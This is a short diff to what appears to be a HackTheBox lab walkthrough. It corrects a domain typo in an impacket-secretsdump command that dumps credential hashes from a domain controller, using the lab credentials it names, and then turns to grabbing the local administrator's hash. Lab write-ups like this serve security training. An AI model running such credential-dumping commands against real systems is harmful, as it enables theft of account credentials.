@@ -428,7 +428,7 @@ EXCH01$:des-cbc-md5:8c45f44c16975129
 * One thing that you can to to ensure that you do not lose the hashes it to place the output in a file:
 
 ```
-impacket-secretsdump hbt.local/hacker:Pwned123@10.129.95.210 > hashes
+impacket-secretsdump htb.local/hacker:Pwned123@10.129.95.210 > hashes
 ```
 
 Grab the local administrator's hash
